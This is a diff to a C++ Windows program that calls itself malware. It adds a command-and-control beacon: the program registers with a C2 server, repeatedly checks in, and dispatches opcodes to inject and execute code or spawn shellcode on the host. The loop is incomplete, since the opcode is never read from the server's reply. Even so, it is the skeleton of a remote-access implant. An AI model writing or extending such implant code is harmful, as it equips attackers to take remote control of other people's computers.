@@ -7,6 +7,15 @@
 
 #include "config.h"
 #include "httpClient.h"
+#include "loader.h"
+
+enum OpCodes
+{
+    SLEEP = 0,
+    INJECT_EXECUTE_CODE,
+    SPAWN_SHELL_CODE,
+    KILL
+};
 
 int wmain(int argc, wchar_t **argv, wchar_t **envp)
 {
@@ -49,7 +58,44 @@ int wmain(int argc, wchar_t **argv, wchar_t **envp)
     requestBody += L"\",\"username\":";
     requestBody += systemUsername;
     requestBody += L"\"}";
-    std::wstring result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_REGISTER_URI, requestHeader, requestBody, false);
-    std::wcout << result << std::endl;
+    std::wstring result;
+    do
+    {
+        Sleep(MALWARE_SLEEP_MILLISECONDS_JITTER);
+        result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_REGISTER_URI, requestHeader, requestBody, MALWARE_C2_SERVER_USE_TLS);
+        std::wcout << result << std::endl;
+    } while (result != L"success");
+    /*we should be registered, goto main event loop*/
+    /*additional init should go here*/
+    bool Success = false;
+    std::wstring buffer;
+    int opCode;
+    while (true)
+    {
+        result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_CHECKIN_URI, L"", L"", MALWARE_C2_SERVER_USE_TLS);
+        
+        switch (opCode)
+        {
+        case SLEEP:
+            Sleep(MALWARE_SLEEP_MILLISECONDS_JITTER);
+            Success = true;
+            break;
+
+        case INJECT_EXECUTE_CODE:
+            Success = InjectExecutionCode(buffer);
+            break;
+
+        case SPAWN_SHELL_CODE:
+            Success = SpawnShellCode(buffer);
+            break;
+
+        case KILL:
+            return 0;
+        }
+        if (!Success)
+        {
+            break;
+        }
+    }
     return 0;
 }
